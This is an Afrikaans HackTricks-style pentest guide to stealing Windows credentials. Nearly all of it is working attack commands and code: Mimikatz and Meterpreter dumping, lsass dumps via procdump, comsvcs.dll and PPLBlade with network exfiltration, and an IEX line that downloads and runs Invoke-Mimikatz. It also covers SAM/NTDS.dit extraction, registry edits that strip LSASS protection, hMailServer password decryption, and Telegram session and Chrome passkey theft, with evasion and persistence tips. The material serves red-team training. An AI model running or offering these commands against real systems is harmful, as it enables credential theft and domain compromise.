# Windows-aanmeldbewyse steel

{{#include ../../banners/hacktricks-training.md}}

## Aanmeldbewyse Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Vind ander dinge wat Mimikatz kan doen op** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Learn about some possible credentials protections here.**](credentials-protections.md) **Hierdie beskerming kan voorkom dat Mimikatz sommige aanmeldbewyse onttrek.**

## Aanmeldbewyse met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **binne die slagoffer na wagwoorde en hashes te soek**.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV omseil

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-nutsding is**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie nutsding gebruik om **die lsass-proses te dump**, **die dump af te laai** en **die credentials plaaslik** uit die dump **te onttrek**.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Hierdie proses word outomaties met [SprayKatz](https://github.com/aas-n/spraykatz) uitgevoer: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** kan die gebruik van **procdump.exe om lsass.exe te dump** as **kwaadwillig** **bespeur**, omdat hulle die stringe **"procdump.exe" en "lsass.exe"** **bespeur**. Dit is dus **stealthier** om die **PID** van lsass.exe as ’n **argument** aan procdump **te gee**, **in plaas van** die **naam lsass.exe.**

### Dumping lsass met **comsvcs.dll**

’n DLL met die naam **comsvcs.dll**, wat in `C:\Windows\System32` gevind word, is verantwoordelik daarvoor om **prosesgeheue te dump** wanneer ’n crash plaasvind. Hierdie DLL bevat ’n **funksie** met die naam **`MiniDumpW`**, wat ontwerp is om met `rundll32.exe` aangeroep te word.\
Die eerste twee argumente is irrelevant, maar die derde een word in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent; die ligging van die dump-lêer is die tweede; en die derde komponent moet presies die woord **full** wees. Geen alternatiewe opsies bestaan nie.\
Nadat hierdie drie komponente ontleed is, skep die DLL die dump-lêer en skryf die geheue van die gespesifiseerde proses daarin.\
**comsvcs.dll** kan gebruik word om die lsass-proses te dump, sodat dit nie nodig is om procdump op te laai en uit te voer nie. Hierdie metode word breedvoerig beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Die volgende opdrag word gebruik om dit uit te voer:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass met Taakbestuurder**

1. Regsklik op die taakbalk en klik op Taakbestuurder
2. Klik op Meer besonderhede
3. Soek die proses "Local Security Authority Process" in die Prosesse-oortjie
4. Regsklik op die proses "Local Security Authority Process" en klik op "Skep dump-lêer".

### Dumping lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is ’n Microsoft-ondertekende binêre lêer wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-suite.

’n Reeds bestaande volledige stelsel-crash dump, of ’n saamgeperste kopie in ’n toeganklike gebruikerslêergids, kan geloofsbriefmateriaal bevat wat vir vanlyn ontleding behoue gebly het. Lêername soos `MEMORY.DMP` en `MEMORY.7z` is slegs leidrade vir hersiening: verifieer die herkoms en toegang, en moenie aanneem dat hulle bruikbare of huidige geloofsbriewe bevat nie.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is ’n Protected Process Dumper Tool wat geheuestortings kan versluier en dit na afgeleë werkstasies kan oordra sonder om dit op skyf te skryf.

**Sleutelfunksies**:

1. Omseiling van PPL-beskerming
2. Versluiering van geheuestortingslêers om Defender se handtekeninggebaseerde opsporingsmeganismes te ontduik
3. Oplaai van geheuestortings met RAW- en SMB-oplaaimetodes sonder om dit op skyf te skryf (lêerlose dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-gebaseerde LSASS-dumping sonder MiniDumpWriteDump

Ink Dragon gebruik ’n dumper met drie fases, genaamd **LalsDumper**, wat nooit `MiniDumpWriteDump` aanroep nie, en daarom word EDR-hooks op daardie API nooit geaktiveer nie:<sup>[[3]](#references)</sup>

1. **Fase 1-laaier (`lals.exe`)** – soek in `fdp.dll` na ’n plekhouer wat uit 32 kleinletter-`d`-karakters bestaan, vervang dit met die absolute pad na `rtu.txt`, stoor die gepatchte DLL as `nfdp.dll` en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as ’n nuwe Security Support Provider (SSP) te laai.
2. **Fase 2 binne LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke greep met `0x20` en karteer die gedekodeerde blob in die geheue voordat dit uitvoering oordra.
3. **Fase 3-dumper** – die gekarteerde payload herimplementeer MiniDump-logika met **direct syscalls** wat vanaf gehashte API-name opgelos word (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). ’n Toegewyde export genaamd `Tom` maak `%TEMP%\<pid>.ddt` oop, stroom ’n saamgeperste LSASS-dump na die lêer en sluit die handvatsel sodat exfiltration later kan plaasvind.

Notas vir die operateur:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll` en `rtu.txt` in dieselfde gids. Fase 1 vervang die hardgekodeerde plekhouer met die absolute pad na `rtu.txt`, dus breek die ketting as jy hulle skei.
* Registrasie vind plaas deur `nfdp` by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` te voeg. Jy kan daardie waarde self vooraf invul om LSASS elke keer wanneer die stelsel begin die SSP te laat herlaai.
* `%TEMP%\*.ddt`-lêers is saamgeperste dumps. Decompress dit plaaslik en voer hulle dan aan Mimikatz/Volatility vir credential-onttrekking.
* Om `lals.exe` te laat loop, vereis admin-/SeTcb-regte sodat `AddSecurityPackageA` slaag; sodra die oproep terugkeer, laai LSASS die rogue SSP deursigtig en voer Fase 2 uit.
* As jy die DLL van die skyf verwyder, word dit nie uit LSASS verwyder nie. Vee óf die registerinskrywing uit en herbegin LSASS (herlaai die stelsel), óf laat dit daar vir langtermyn-persistence.

## CrackMapExec

### Dump SAM-hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA-geheime

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Stort die NTDS.dit vanaf die teiken-DC af

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump die NTDS.dit-wagwoordgeskiedenis vanaf teiken-DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Wys die pwdLastSet-kenmerk vir elke NTDS.dit-rekening

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Steel SAM & SYSTEM

Hierdie lêers behoort **te wees** in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie sommer op die gewone manier kopieer nie**, omdat hulle beskerm is.

### Uit die Register

Die maklikste manier om hierdie lêers te steel, is om ’n kopie uit die register te kry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Laai** daardie lêers na jou Kali-masjien af en **onttrek die hashes** deur te gebruik:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Jy kan hierdie diens gebruik om beskermde lêers te kopieer. Jy moet 'n Administrator wees.

#### Using vssadmin

Die vssadmin-binêre lêer is slegs beskikbaar in Windows Server-weergawes.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Maar jy kan dieselfde vanaf **Powershell** doen. Dit is ’n voorbeeld van **hoe om die SAM-lêer te kopieer** (die skyf wat gebruik word, is "C:" en dit word in C:\users\Public gestoor), maar jy kan dit gebruik om enige beskermde lêer te kopieer:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om ’n kopie van SAM, SYSTEM en ntds.dit te maak.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory-geloofsbriewe - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory** en bevat belangrike data oor gebruikerobjekte, groepe en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is ’n **Extensible Storage Engine (ESE)**-databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Drie primêre tabelle word in hierdie databasis onderhou:

- **Data Table**: Hierdie tabel stoor besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou verhoudings, soos groeplidmaatskappe, dop.
- **SD Table**: **Sekuriteitsbeskrywers** vir elke objek word hier gehou, wat die sekuriteit en toegangsbeheer vir die gestoorde objekte verseker.

Christoffer Andersson se navorsing oor die databasislaag dokumenteer hierdie tabelle en hul weergawe-spesifieke gedrag in meer besonderhede.<sup>[[8]](#references)</sup>

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer, en dit word deur _lsass.exe_ gebruik. Dan kan **’n deel** van die **NTDS.dit**-lêer **binne die `lsass`-geheue** geleë wees (jy kan waarskynlik die data waartoe die jongste toegang verkry is, vind weens die prestasieverbetering wat deur ’n **cache** gebied word).

#### Decrypting the hashes inside NTDS.dit

Die hash word drie keer geënkripteer:

1. Decrypt die Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. Decrypt die **hash** met die **PEK** en **RC4**.
3. Decrypt die **hash** met **DES**.

Die **PEK** het **dieselfde waarde op elke domeinbeheerder**, maar dit is **geënkripteer** binne **NTDS.dit** met die domeinbeheerder-spesifieke **BOOTKEY** van daardie domeinbeheerder se **SYSTEM**-hive. Om geloofsbriewe te onttrek, is dus beide **NTDS.dit** en **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) nodig.

### Copying NTDS.dit using Ntdsutil

Beskikbaar sedert Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system)-truuk gebruik om die **ntds.dit**-lêer te kopieer. Onthou dat jy ook ’n kopie van die **SYSTEM-lêer** nodig het (gebruik weer die [**dump dit uit die register of gebruik die volume shadow copy**](#stealing-sam-and-system)-truuk).

### **Onttrekking van hashes uit NTDS.dit**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** **verkry** het, kan jy nutsmiddels soos _secretsdump.py_ gebruik om die **hashes te onttrek**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Jy kan hulle ook **outomaties onttrek deur 'n geldige domeinadministrateurgebruiker te gebruik**:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Vir **groot NTDS.dit-lêers** word aanbeveel dat dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) onttrek word.

U kan ook die **metasploit-module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Onttrekking van domeinobjekte uit NTDS.dit na ’n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na ’n SQLite-databasis onttrek word. Nie net geheime nie, maar ook die volledige objekte en hul eienskappe word onttrek, sodat verdere inligting onttrek kan word wanneer die rou NTDS.dit-lêer reeds verkry is.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Die `SYSTEM`-hive is opsioneel, maar maak dekripsie van geheime moontlik (NT- en LM-hashes, aanvullende aanmeldbewyse soos cleartext-wagwoorde, Kerberos- of trust-sleutels, NT- en LM-wagwoordgeskiedenisse). Saam met ander inligting word die volgende data onttrek: gebruiker- en masjienrekeninge met hul hashes, UAC-vlae, tydstempel van laaste aanmelding en wagwoordverandering, rekeningbeskrywings, name, UPN, SPN, groepe en rekursiewe lidmaatskappe, organisasie-eenhede se boomstruktuur en lidmaatskap, vertroude domeine met trust-tipe, rigting en eienskappe...

## Lazagne

Laai die binêre lêer af [hier](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binêre lêer gebruik om aanmeldbewyse uit verskeie sagteware te onttrek.

```
lazagne.exe all
```

## Ander nutsmiddels om geloofsbriewe uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie nutsmiddel kan gebruik word om geloofsbriewe uit die geheue te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek geloofsbriewe uit die SAM-lêer

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Onttrek aanmeldbewyse uit die SAM-lêer

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en **voer dit net uit**; die wagwoorde sal onttrek word.

## Ontginning van onaktiewe RDP-sessies en verswakking van sekuriteitskontroles

Ink Dragon se FinalDraft RAT bevat ’n `DumpRDPHistory`-tasker waarvan die tegnieke nuttig is vir enige red-teammer:<sup>[[3]](#references)</sup>

### Telemetrieversameling in die styl van DumpRDPHistory

* **Uitgaande RDP-teikens** – ontleed elke gebruikers-hive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke sub-sleutel stoor die bedienernaam, `UsernameHint` en die tydstempel van die laaste skryfbewerking. Jy kan FinalDraft se logika met PowerShell naboots:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Bewyse van inkomende RDP** – raadpleeg die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`-logboek vir gebeurtenis-ID's **21** (suksesvolle aanmelding) en **25** (ontkoppeling) om vas te stel wie die stelsel geadministreer het:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie steeds bestaan. CredSSP + NTLM-terugval laat hul verifier en tokens in LSASS agter, waarna dit oor SMB/WinRM hergebruik kan word om `NTDS.dit` te bekom of volharding op domeinbeheerders te vestig.

### Register-afgraderings wat deur FinalDraft geteiken word

Dieselfde implant peuter ook met verskeie registersleutels om diefstal van geloofsbriewe makliker te maak:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Die instelling van `DisableRestrictedAdmin=1` dwing volle hergebruik van geloofsbriewe/kaartjies tydens RDP af, wat pass-the-hash-styl-pivots moontlik maak.
* `LocalAccountTokenFilterPolicy=1` deaktiveer UAC-tokenfiltrering sodat plaaslike administrateurs onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM-administrateur aanmeld terwyl die DC aanlyn is, wat aanvallers nog ’n ingeboude rekening met hoë voorregte gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat geheuetoegang vir dumpers soos LalsDumper eenvoudig maak.

## hMailServer-konfigurasiegeloofsbriewe (ná kompromittering)

Gaan die presiese konfigurasielêers `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` en `C:\ProgramData\hMailServer\hMailServer.ini` na, volgens die installasie-uitleg. ’n Leesbare, nieleë `[Security] AdministratorPassword=`-waarde is ’n hMailServer-administrasiewagwoordhash; dit is nie bewys van ’n Windows Administrator-wagwoord nie. As daardie geloofsbrief herwin word, vereis enige pivot na ’n Windows-rekening dat wagwoordhergebruik en aanmeldregte onafhanklik bevestig word.

Vir installasies wat ’n SQL CE-databasis gebruik, beskerm die afsonderlike `[Database] Password=`-waarde in die INI die databasis. In ouer installasies is hierdie waarde met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-greep-woord-endianness-wisselings Blowfish-geënkripteer. Gebruik die heksadesimale string uit die INI met hierdie Python-brokkie:<sup>[[2]](#references)</sup>

Bevestig eers dat die huidige rekening **beide** die INI en die ooreenstemmende SQL CE `.sdf`-databasis kan lees. Die INI-wagwoord beskerm die databasis; dit is apart van die posbusrekeninghashes wat daarin gestoor word. Inspekteer of gradeer ’n **kopie** van ’n databasis wat tans gebruik word op; moet nooit die lewendige lêer gebruik nie.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Met die clear-text-wagwoord, kopieer die SQL CE-databasis om lêerslotte te vermy, laai die 32-bit-provider, en gradeer op indien nodig voordat jy navraag oor hashes doen:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Die `accountpassword`-kolom gebruik die hMailServer-hashformaat (hashcat-modus `1421`). ’n Gebreekte posbuswagwoord bied slegs ’n Windows-gebruiker-pivot as daardie wagwoord deur ’n plaaslike/domeinrekening hergebruik word en daardie rekening die nodige afstandaanmeldregte het.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Sommige tools vang **plaintext-aanmeldwagwoorde** vas deur die LSA-aanmeldterugroepfunksie `LsaApLogonUserEx2` te onderskep. Die idee is om die terugroepfunksie van die verifikasiepakket te hook of te wrap sodat aanmeldbewyse **tydens aanmelding** (voor hashing) vasgevang en dan na skyf geskryf of aan die operateur teruggestuur word. Dit word gewoonlik geïmplementeer as ’n helper wat in LSA inspuit of daarby registreer en dan elke suksesvolle interaktiewe/netwerkaanmelding met die gebruikersnaam, domein en wagwoord aanteken.<sup>[[1]](#references)</sup>

Operasionele notas:
- Vereis plaaslike admin/SYSTEM om die helper in die verifikasiepad te laai.
- Vasgevangde aanmeldbewyse verskyn slegs wanneer ’n aanmelding plaasvind (interaktief, RDP, diens- of netwerkaanmelding, afhangend van die hook).

## SSMS Gestoorde Verbindingsaanmeldbewyse (sqlstudio.bin)

SQL Server Management Studio (SSMS) stoor gestoorde verbindingsinligting in ’n `sqlstudio.bin`-lêer per gebruiker. Spesiale dumpers kan die lêer ontleed en gestoorde SQL-aanmeldbewyse herwin. In shells wat slegs opdraguitvoer teruggee, word die lêer dikwels uitgevoer deur dit as Base64 te enkodeer en na stdout te druk.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Aan die operateurkant, bou die lêer weer en voer die dumper plaaslik uit om geloofsbriewe te herwin:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Telegram Desktop `tdata`-sessiediefstal

Telegram Desktop hou magtigings- en rekeningtoestand in sy **`tdata`**-gids. ’n Gekopieerde sessie kan met versoenbare nutsmiddels gelaai word om te staaf sonder die rekeningwagwoord, solank daardie magtiging geldig bly; as plaaslike data-enkripsie geaktiveer is, benodig die stealer ook die wagwoordkode. ’n Gemagtigde sessie kan dan identiteitsdata, metadata oor gesprekke en lidmaatskap, boodskappe en aflaaibare media blootlê.<sup>[[10]](#references)</sup>

### Ontdekking en verkryging

Soek in beide geïnstalleerde en draagbare uitlegte; Microsoft Store-pakketname verskil, dus lys pakketgidse wat `TelegramMessenge` bevat en inspekteer hul `LocalCache\Roaming`-subboom.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

As gewone leesbewerkings misluk en die proses-token reeds `SeBackupPrivilege` bevat en dit geaktiveer het, bied toegang met rugsteunbewustheid ’n terugvalopsie; dit verkry nie die privilege nie en verhoog nie die proses se regte nie. `CreateFileW` met `FILE_FLAG_BACKUP_SEMANTICS` kan rugsteun-/herstel-semantiek aanvra en lêersekuriteitskontroles omseil wanneer die vereiste token-privileges teenwoordig is, maar die vlag alleen omseil nie ’n onversoenbare deelvergrendeling nie.<sup>[[10]](#references)[[11]](#references)</sup>

Skep/lees ’n **Volume Shadow Copy** vir lêers wat tans gesluit is; vir lêers wat deur ACL’s geblokkeer word, gebruik `robocopy /B` rugsteunmodus en omseil dit lêer- en gids-ACL’s.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

'n Bandwydtebewuste implant kan aanvanklik net die lêerpad-inventaris indien, 'n momentopname-identifiseerder plus die paaie wat reeds deur die C2 gestoor is ontvang, en slegs ontbrekende lêers oplaai. Klein inkrementele oordragte ná rekursiewe `tdata`-enumerasie kan dus steeds op suksesvolle sessiediefstal dui.<sup>[[10]](#references)</sup>

### Opsporing en inperking

Korrelleer rekursiewe toegang tot `tdata` deur 'n nie-Telegram-proses met die aktivering van `SeBackupPrivilege`, lêeropenings met rugsteunsemantiek, VSS-aktiwiteit of 'n kinderproses `robocopy.exe` wat `/B` gebruik. Soek ook na vinnige enumerasie van beide `%APPDATA%` en `%LOCALAPPDATA%\Packages`, gevolg deur uitgaande verbindings vanaf dieselfde proses. Gebruik ná 'n kompromittering **Settings → Devices** (of **Privacy & Security → Active Sessions**) om onbekende sessies te beëindig; die aktivering van tweestap-verifikasie alleen herroep nie 'n magtiging wat reeds gesteel is nie.<sup>[[10]](#references)[[13]](#references)</sup>

## Diefstal van Passkeys / WebAuthn-eiebewyse vanaf Chrome op Windows

As kode-uitvoering as die **slagoffer gebruiker** op 'n Windows-gasheer verkry word wat **Chrome + Google Password Manager-sinkroniseerde passkeys** gebruik, word passkeys 'n interessante post-exploitation-teiken, selfs **sonder admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante plaaslike artefakte

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** stoor protobuf-geënkodeerde **`WebauthnCredentialSpecifics`**-rekords. ’n Proses van dieselfde gebruiker kan die **RP ID**, **gebruikersnaam**, **credential ID** en geënkripteerde privaat-sleutelmateriaal vir gesinkroniseerde passkeys lys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stoor plaaslike toestel-inskrywingstoestand, soos **`wrapped_identity_private_key`** en die toegedraaide geheim wat gebruik word om gesinkroniseerde credentials te herwin.<sup>[[4]](#references)</sup>

Vinnige triage:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-gebonde sleutelblobbe kan steeds as ’n plaaslike ondertekeningsorakel misbruik word

As die blaaier ’n TPM-gesteunde identiteitsleutel as **`NCRYPT_OPAQUE_KEY_BLOB`** uitvoer en daardie blob in ’n gebruikerstoeganklike toestand stoor, hoef malware **nie** die rou private sleutel te onttrek nie. Dit kan die blob eenvoudig op **dieselfde masjien** herinvoer en die plaaslike TPM vra om data te onderteken wat deur die aanvaller beheer word:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Dit beteken dat **hardewarebinding uitvoer van die toestel af voorkom, maar nie gebruik deur dieselfde gebruiker op die gekompromitteerde eindpunt nie**.

### Praktiese misbruikroetes

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Tel `WebauthnCredentialSpecifics` op uit Chrome se LevelDB.
   - Begin 'n passkey-aanmelding en verkry 'n vars WebAuthn-uitdaging.
